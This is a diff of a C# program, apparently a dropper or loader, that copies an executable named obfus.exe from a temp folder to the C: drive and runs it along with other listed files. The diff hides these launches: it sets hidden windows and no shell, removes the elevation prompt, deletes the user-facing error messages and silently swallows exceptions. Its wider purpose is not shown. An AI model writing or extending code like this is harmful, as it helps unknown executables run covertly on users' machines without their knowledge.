@@ -375,52 +375,41 @@ class Program
             string obfusExePath = Path.Combine(_tempDir, ""obfus.exe"");
             string obfusCDrivePath = Path.Combine(cDriveDir, ""obfus.exe"");
             
-            
             if (!File.Exists(obfusExePath))
             {
                 string obfusCsPath = Path.Combine(_tempDir, ""obfus.cs"");
                 
                 if (File.Exists(obfusCsPath))
                 {
-                    
                     File.Copy(obfusCsPath, obfusExePath, true);
                 }
                 else
                 {
-                    MessageBox.Show(""Не найдены файлы obfus.exe или obfus.cs"", 
-                                  ""Предупреждение"", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                     return;
                 }
             }
             
             if (File.Exists(obfusExePath))
             {
-                
                 File.Copy(obfusExePath, obfusCDrivePath, true);
-                
                 
                 ProcessStartInfo startInfo = new ProcessStartInfo();
                 startInfo.FileName = obfusCDrivePath;
-                startInfo.UseShellExecute = true;
-                startInfo.WindowStyle = ProcessWindowStyle.Normal;
+                startInfo.UseShellExecute = false;
+                startInfo.CreateNoWindow = true;
+                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 startInfo.WorkingDirectory = cDriveDir;
-                startInfo.CreateNoWindow = false;
                 
                 Process proc = Process.Start(startInfo);
                 
                 if (proc != null)
                 {
-                    
                     _processedFiles.Add(obfusExePath.ToLower());
                     _processedFiles.Add(obfusCDrivePath.ToLower());
                 }
             }
         }
-        catch (Exception ex)
-        {
-            MessageBox.Show(""Ошибка обработки файла obfus: "" + ex.Message, ""Ошибка"", 
-                          MessageBoxButtons.OK, MessageBoxIcon.Error);
-        }
+        catch {}
     }
 
     
@@ -433,30 +422,24 @@ class Program
             {
                 try
                 {
-                    
                     if (_processedFiles.Contains(file.ToLower()))
                         continue;
                     
                     ProcessStartInfo startInfo = new ProcessStartInfo();
                     startInfo.FileName = file;
-                    startInfo.UseShellExecute = true;
-                    startInfo.WindowStyle = ProcessWindowStyle.Normal;
-                    startInfo.Verb = ""runas""; 
+                    startInfo.UseShellExecute = false;
+                    startInfo.CreateNoWindow = true;
+                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                     Process.Start(startInfo);
-                    
                     
                     _processedFiles.Add(file.ToLower());
                     
                     Thread.Sleep(200);
                 }
-                catch (Exception ex) 
-                { 
-                    MessageBox.Show(""Ошибка запуска файла "" + Path.GetFileName(file) + "": "" + ex.Message,
-                                    ""Ошибка"", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                }
+                catch {}
             }
         }
-        catch { }
+        catch {}
     }
 
     
